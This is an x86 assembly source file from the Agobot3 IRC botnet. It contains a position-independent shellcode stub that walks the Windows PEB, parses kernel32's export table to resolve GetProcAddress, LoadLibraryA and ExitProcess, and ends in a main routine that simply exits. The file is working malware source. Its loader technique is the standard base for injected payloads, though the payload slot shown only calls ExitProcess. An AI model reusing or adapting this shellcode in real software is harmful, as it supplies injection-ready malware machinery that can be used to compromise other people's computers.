; Agobot3 - a modular IRC bot for Win32 / Linux
; Copyright (c) 2004 Ago and the Agobot team
; All rights reserved.
; 
; This is private software, you may redistribute it under the terms of
; the APL(Ago's Private License) which follows:
;   
; Redistribution and use in binary forms, with or without modification,
; are permitted provided that the following conditions are met:
; 1. The name of the author may not be used to endorse or promote products
;    derived from this software without specific prior written permission.
; 2. The binary and source may not be sold and/or given away for free.
; 3. The licensee may only create binaries for his own usage, not for any
;    third parties.
; 4. The person using this sourcecode is a developer of said sourcecode.
; 
; Redistribution and use in source forms, with or without modification,
; are not permitted.
; 
; This license may be changed without prior notice.
; 
; THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
; IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
; OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
; IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
; INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
; NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
; DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
; THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
; (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
; THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

BITS 32											; 32bit addressing
ORG 0x0											; for relative jumps etc...

	jmp data									; jump to data
doit:											; "Its the Sounds of Science..." - Beastie Boys
	pop ebx										; get pointer to data to ebx
	push esi									; backup esi on the stack
	push edi									; backup edi on the stack
	push eax									; backup eax on the stack

	call get_k32								; get proc addresses

	lea esi, [ebx-memaddy+kernel32_dll]			; lea name of kernel32 into esi

	lea edi, [ebx-memaddy+kernel32_gpa]			; lea name of kernel32.GetProcAddress into edi
	mov dword [ebx-memaddy+lpr_size], 0xF		; size of gpa
	call loadproc								; call loadproc	
	mov [ebx-memaddy+gpa_ptr], eax				; store kernel32.GetProcAddress

	lea edi, [ebx-memaddy+kernel32_lla]			; lea name of kernel32.LoadLibraryA into edi
	mov dword [ebx-memaddy+lpr_size], 0xD		; size of lla
	call loadproc								; call loadproc	
	mov [ebx-memaddy+lla_ptr], eax				; store kernel32.LoadLibraryA

	lea edi, [ebx-memaddy+kernel32_exp]			; lea name of kernel32.ExitProcess into edi
	call mygpa									; call mygpa	
	mov [ebx-memaddy+exprocess_ptr], eax		; store kernel32.ExitProcess

	push ebx									; backup ebx on the stack
	call mainfunc								; call main function
data:
	call doit									; call doit
	memaddy			dd	0						; a variable !
	kernel32_dll	db	"kernel32", 0			; name of kernel32.dll
	kernel32_gpa	db	"GetProcAddress", 0		; ^---> GetProcAddress
	kernel32_lla	db	"LoadLibraryA", 0		; ^---> LoadLibraryA
	kernel32_exp	db	"ExitProcess", 0		; ^---> ExitProcess
	exprocess_ptr	dd	0						; ^---> pointer to ExitProcess
	lla_ptr			dd	0						; ^---> pointer to LoadLibraryA
	gpa_ptr			dd	0						; ^---> pointer to GetProcAddress
	kernel_base		dd	0						; base address of the kernel
	k32_numnames	dd	0						; number of exports in kernel32
	k32_funcaddr	dd	0						; address of functions in kernel32
	k32_nameaddr	dd	0						; address of names in kernel32
	k32_numords		dd	0						; number of ordinals in kernel32
	loadpr_count	dd	0						; counter for loadproc
	lpr_size		dd	0						; size of string for loadproc
; mygpa:
; 
; loads functions via GetProcAddress
;
; input:
; esi = name of dll
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
mygpa:
	push ecx									; backup ecx
	push edi									; backup edi
	push esi									; backup esi
	
	push esi									; push dll name from esi on the stack
	call dword [ebx-memaddy+lla_ptr]			; call LoadLibraryA
	push eax									; eax -> ecx
	pop ecx										; eax -> ecx
	push edi									; push proc name from edi on the stack
	push ecx									; push handle to library on the stack
	call dword [ebx-memaddy+gpa_ptr]			; call GetProcAddress

	pop esi										; restore esi
	pop edi										; restore edi
	pop ecx										; restore ecx
	
	ret											; return to caller
; loadproc:
;
; loads functions from kernel32
;
; input:
; edi = name of function
; ebx = address of data segment
;
; output:
; eax = virtual address of function
;
loadproc:
	xor eax, eax								; clear eax
	mov [ebx-memaddy+loadpr_count],eax			; set our counter to 0
loadproc_loop:
	mov edx, [ebx-memaddy+loadpr_count]			; edx = our counter in the loop
	cmp edx, [ebx-memaddy+k32_numnames]			; compare it to our limit
	jge loadproc_exit							; if were greater or equal to it exit loop
	inc edx										; else increment the counter
	mov [ebx-memaddy+loadpr_count], edx			; and save it for later
	xor eax, eax								; clear eax
	mov eax, [ebx-memaddy+loadpr_count]			; eax = counter
	shl eax, 0x02								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_nameaddr]			; ecx = AddressOfNames
	add ecx, eax								; ecx = ecx + eax
	mov eax, [ecx]								; eax = pointer from ecx
	add eax, [ebx-memaddy+kernel_base]			; align w/ base addr
	push edi									; backup edi
	push esi									; backup esi
	push ecx									; backup ecx
	mov esi, edi								; esi = address of name to compare to [edi]
	mov edi, eax								; edi = address of name to compare w/
	mov ecx, [ebx-memaddy+lpr_size]				; ecx = the length of our search string
	rep cmpsb									; compare the strings pointed to by edi,esi and repeat this ecx times
	pop ecx										; restore ecx
	pop esi										; restore esi
	pop edi										; restore edi
	jne loadproc_loop							; if not equal goto top of loop else we found the function we want 
	xor eax, eax								; clear eax
	mov eax, [ebx-memaddy+loadpr_count]			; eax = value of our counter, we need this for calculations later
	shl eax, 0x01								; eax = eax * 2
	mov ecx, [ebx-memaddy+k32_numords]			; ecx = pointer to ordinals
	add ecx, eax								; add the multiplyed counter to it
	xor eax, eax								; clear eax
	mov ax, word [ecx]							; ax = the ordinal for the function we found
	shl eax, 0x02								; multiply it by 4
	mov ecx, [ebx-memaddy+k32_funcaddr]			; ecx = pointer to address of functions
	add eax, ecx								; add it to (ordinal*4)
	mov ecx, [eax]								; ecx = rva of function
	add ecx, [ebx-memaddy+kernel_base]			; align it, ecx = va of function
	mov eax, ecx								; move it to eax
	ret											; return to caller

loadproc_exit
	xor eax, eax								; clear eax
	ret											; return to caller

get_k32_exit:
	call 0										; crash

get_k32_9x:
	mov eax, [ds:eax+0x34]						; get Win9x PEB
	mov ebp, [ds:eax+0xb8]						; same here
	jmp get_k32_cont							; return to get_k32

get_k32:
	push eax									; backup eax
	push ecx									; backup ecx
	push esi									; backup esi
	push ebp									; backup ebp

	mov eax, [fs:0x30]							; get the PEB into eax
	test eax, eax								; detect Win9x PEB
	js get_k32_9x								; get the Win9x PEB

get_k32_cont:
	mov eax, [ds:eax+0xC]						; get PROCESS_MODULE_INFO addr
	mov esi, [ds:eax+0x1C]						; get InInitOrder.flink
	lodsd										; get InInitOrder.blink
	mov ebp, [ds:eax+0x8]						; get the kernel base
	mov [ebx-memaddy+kernel_base], ebp			; store the kernel base
	mov eax, ebp								; move it to eax

	cmp word [eax], 'MZ'						; check if we have a exe image
	jne get_k32_exit							; exit if we dont
	add eax, 0x3C								; eax = pointer to pe header offset
	mov ecx, [eax]								; get the pointer
	add ecx, [ebx-memaddy+kernel_base]			; add image base to align it

	cmp word [ecx], 'PE'						; check if we have a pe image
	jne get_k32_exit							; exit if we dont
	add ecx, 0x78								; ecx = pointer to virtual address of export dir address
	mov esi, [ecx]								; esi = virtual address of export dir address
	add esi, [ebx-memaddy+kernel_base]			; add image base to align it

	add esi, 0x18								; esi points to NumberOfNames
	lodsd										; load number of names into eax
	mov [ebx-memaddy+k32_numnames], eax			; save it for later

	lodsd										; load address of funcs into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_funcaddr], eax			; save it

	lodsd										; load address of names into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_nameaddr], eax			; save it

	lodsd										; load number of ordinals into eax
	add eax, [ebx-memaddy+kernel_base]			; align it
	mov [ebx-memaddy+k32_numords], eax			; save it

	pop ebp										; restore ebp
	pop esi										; restore esi
	pop ecx										; restore ecx
	pop eax										; restore eax

	ret											; return to caller
mainfunc:
	push 0x1
	call [ebx-memaddy+exprocess_ptr]			; ExitProcess(1);
	ret											; return to caller


